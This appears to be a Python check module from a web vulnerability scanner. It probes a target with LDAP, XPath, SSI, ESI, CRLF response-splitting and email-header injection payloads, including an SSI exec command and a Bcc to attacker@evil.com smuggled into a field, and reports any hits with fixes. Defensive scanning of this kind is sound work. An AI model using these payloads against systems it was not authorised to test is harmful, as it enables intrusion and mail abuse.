"""#32 + #33 + #34 — misc injection class probes.

#32 LDAP / XPATH / SSI / ESI injection — sends specific payloads against
    common parameters; flags any 500/error / unexpected reflection.
#33 HTTP response splitting — `\\r\\n` in cookie/redirect values.
#34 Email-header injection deep — From/Reply-To/Bcc/multi-line bodies.

All aggressive-only.
"""
from __future__ import annotations

from ..http import Client
from ..models import Finding


INJECTION_PROBES = (
    # (name, param, value, expected_marker_in_response)
    ("LDAP", "q", "*)(uid=*))(|(uid=*", "LDAP filter"),
    ("XPath", "id", "1' or '1'='1", "Invalid XPath"),
    ("SSI", "page", "<!--#exec cmd=\"id\" -->", "uid="),
    ("ESI", "x", '<esi:include src="x" />', "<esi"),
    ("CRLF response split", "redirect", "x%0d%0aSet-Cookie:%20bad=1", "Set-Cookie: bad"),
    ("Email header inj", "email", "victim@example.com%0d%0aBcc:%20attacker@evil.com", "@evil.com"),
)


async def check(client: Client, ctx: dict) -> list[Finding]:
    if not ctx.get("aggressive"):
        return [Finding(severity="info", title="Misc injection probes skipped (passive)",
                        evidence="Pass --aggressive.", remediation="No action.", url=ctx["target"])]
    step = ctx.get("step") or (lambda _s: None)
    findings = []
    for label, param, value, marker in INJECTION_PROBES:
        step(f"{label} probe...")
        r = await client.get(f"/?{param}={value}")
        if r is None:
            continue
        body = (r.text or "")[:5000]
        if marker.lower() in body.lower():
            findings.append(Finding(
                severity="high",
                title=f"{label} injection — response contains marker '{marker[:20]}'",
                evidence=f"GET /?{param}={value}\n  marker '{marker[:30]}' present in response.",
                remediation=f"Sanitise {param} input. {label} requires context-specific escaping — see OWASP cheat sheets.",
                url=ctx["target"] + f"/?{param}={value}",
            ))
    if not findings:
        return [Finding(severity="info",
                        title=f"Misc injection probes — clean ({len(INJECTION_PROBES)} classes tested)",
                        evidence="LDAP / XPath / SSI / ESI / CRLF / email-header markers absent from responses.",
                        remediation="No action.", url=ctx["target"])]
    return findings
